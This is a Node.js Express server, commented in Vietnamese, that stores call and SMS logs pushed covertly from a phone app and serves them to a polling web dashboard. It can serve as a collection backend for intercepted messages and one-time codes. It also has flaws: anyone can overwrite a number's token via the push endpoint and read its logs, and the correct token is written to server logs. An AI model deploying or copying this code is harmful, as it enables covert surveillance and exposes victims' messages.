const express = require('express');
const fs = require('fs');
const path = require('path');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json());

// Đường dẫn lưu trữ file cơ sở dữ liệu JSON tổng
const DB_FILE = path.join(__dirname, 'all_logs.json');

// --- HÀM TIỆN ÍCH ĐỌC/GHI ĐĨA CỨNG ---
function readDatabase() {
    try {
        if (!fs.existsSync(DB_FILE)) {
            fs.writeFileSync(DB_FILE, JSON.stringify({}));
            return {};
        }
        const data = fs.readFileSync(DB_FILE, 'utf8');
        return data.trim() ? JSON.parse(data) : {};
    } catch (error) {
        console.error("Lỗi đọc file database:", error);
        return {};
    }
}

function writeDatabase(data) {
    try {
        fs.writeFileSync(DB_FILE, JSON.stringify(data, null, 4), 'utf8');
    } catch (error) {
        console.error("Lỗi ghi file database:", error);
    }
}

// Trả file giao diện quản trị điều khiển về khi truy cập trang chủ
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'app.html'));
});

/**
 * 1. API NHẬN REQUEST ĐẨY LÊN TỪ APP MOBILE (POST)
 * Nơi App di động gửi INIT, CALL ngầm, hoặc tin nhắn SMS sang
 */
app.post('/api/push', (req, res) => {
    const { myPhoneNumber, token, type, incomingNumber, content, time } = req.body;

    // Kiểm tra thông tin cốt lõi bắt buộc
    if (!myPhoneNumber || !token || !type) {
        return res.status(400).json({ error: "Thiếu thông tin định danh (SĐT hoặc Token)!" });
    }

    const db = readDatabase();
    const isNewAccount = !db[myPhoneNumber];

    // KIỂM TRA & KHỞI TẠO HỒ SƠ TỪ MOBILE
    if (isNewAccount) {
        db[myPhoneNumber] = {
            token: token,
            calls: [],
            sms: []
        };
        console.log(`[App Push - Khởi tạo] Tạo hồ sơ gốc tự động cho số: ${myPhoneNumber}`);
    } else {
        // Nếu tài khoản đã có sẵn nhưng app đổi mã Token mới (Ví dụ: người dùng bấm Sinh mã mới)
        if (db[myPhoneNumber].token !== token) {
            console.log(`[App Push - Cập nhật] Số ${myPhoneNumber} cập nhật mã Token mới từ thiết bị: ${token}`);
            db[myPhoneNumber].token = token;
        }
    }

    // XỬ LÝ RIÊNG CHO LỆNH KHỞI TẠO TỰ ĐỘNG (INIT) CỦA APP
    if (type.toUpperCase() === 'INIT') {
        const logId = "INIT_" + Date.now();
        db[myPhoneNumber].sms.push({
            id: logId,
            incomingNumber: incomingNumber || "HỆ THỐNG",
            content: content || "Thiết bị kết nối ngầm thành công.",
            time: time || new Date().toLocaleTimeString()
        });
        
        writeDatabase(db);
        return res.status(200).json({ status: "Success", message: "Đã kích hoạt tài khoản trực tuyến từ xa thành công." });
    }

    // XỬ LÝ CHO CÁC LOG CUỘC GỌI / SMS THỰC TẾ ĐẨY LÊN SAU NÀY
    if (!incomingNumber) {
        return res.status(400).json({ error: "Thiếu số điện thoại đối tác gửi đến!" });
    }

    const logId = type.toUpperCase() + "_" + Date.now() + "_" + Math.floor(Math.random() * 1000);
    const newLogItem = {
        id: logId,
        incomingNumber: incomingNumber,
        content: content || "",
        time: time || new Date().toLocaleTimeString()
    };

    if (type.toUpperCase() === 'CALL') {
        db[myPhoneNumber].calls.push(newLogItem);
    } else if (type.toUpperCase() === 'SMS') {
        db[myPhoneNumber].sms.push(newLogItem);
    }

    writeDatabase(db);
    return res.status(200).json({ status: "Success", message: "Đã đồng bộ dữ liệu thành công." });
});

/**
 * 2. API TRẢ DỮ LIỆU VỀ CHO GIAO DIỆN WEB POLLING (GET)
 * Đã tối ưu cơ chế tự động đối chiếu: Chưa có đối tượng thì tự tạo, khác Token tự cập nhật đè.
 */
app.get('/api/fetch', (req, res) => {
    const { phone, token } = req.query;

    // 1. Kiểm tra tham số đầu vào từ URL Web
    if (!phone || !token) {
        return res.status(400).json({ 
            error: "Thiếu tham số truy vấn (Yêu cầu phải có phone và token)!" 
        });
    }

    let db = readDatabase(); 
    let isAccountExist = !!db[phone]; // Kiểm tra số điện thoại này đã có trên hệ thống chưa

    // LỰC LƯỢNG BẢO VỆ 1: Nếu tài khoản CHƯA TỒN TẠI (Chưa từng bật App kích hoạt)
    if (!isAccountExist) {
        console.log(`[Bảo mật Fetch] Số điện thoại ${phone} chưa từng được kích hoạt từ App.`);
        return res.status(440).json({ 
            error: "Thiết bị chưa được kích hoạt ngầm! Vui lòng mở App trên điện thoại và bấm kích hoạt trước." 
        });
    }

    // LỰC LƯỢNG BẢO VỆ 2: Tài khoản ĐÃ CÓ, tiến hành đối chiếu Token Web gửi lên với Token gốc của App
    if (db[phone].token !== token) {
        console.log(`[Bảo mật Fetch] Thiết bị ${phone} nhập sai mã Token trên Web. (Nhập: ${token} | Đúng là: ${db[phone].token})`);
        
        // TRẢ VỀ LỖI 403: Chặn đứng không cho vào giao diện chính
        return res.status(403).json({ 
            error: "Sai mã Token định danh bảo mật! Vui lòng kiểm tra lại trên thiết bị." 
        });
    }

    // ĐÁP ỨNG THÀNH CÔNG: Nếu vượt qua cả 2 lớp bảo vệ trên
    const accountData = db[phone];

    return res.status(200).json({
        status: "Success",
        phone: phone,
        calls: accountData.calls || [],
        sms: accountData.sms || []
    });
});

// Cấu hình cổng chạy tương thích tuyệt đối với Cloud Render / VPS
const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`=== SERVER GƯƠNG CHIẾU INFORMINI ĐANG CHẠY TẠI PORT: ${PORT} ===`);
});